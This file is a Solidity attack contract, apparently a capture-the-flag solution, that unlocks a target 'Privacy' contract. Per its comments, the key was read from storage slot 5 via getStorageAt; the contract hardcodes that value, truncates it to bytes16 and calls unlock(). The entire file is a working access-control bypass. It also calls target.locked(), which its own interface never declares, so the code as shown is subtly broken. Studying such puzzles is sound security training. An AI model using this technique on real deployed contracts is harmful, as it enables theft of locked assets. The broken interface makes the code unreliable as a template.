// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
 interface IPrivacy {
    function unlock(bytes16 _key) external ;
 }

 contract hack {
    IPrivacy target;
    constructor(address _address) {
        target = IPrivacy(_address);
    }

    function attack() public {
      //The key is in the 5th slot 
      // in the console , we can get the content of the fifth slot using this command : await web3.eth.getStorageAt(instance, 5)
      // the result was 0x0fc10c7d8c40de4f481f877d6e91b24835a0e982155a0832bd65ffc13bcb137a . But we still need to typecast this key to bytes16
      bytes32 key = 0x0fc10c7d8c40de4f481f877d6e91b24835a0e982155a0832bd65ffc13bcb137a ;
      bytes16 realKey = bytes16(key);
      target.unlock(realKey);
      require(!target.locked() , "hacking failed" );
    }
 }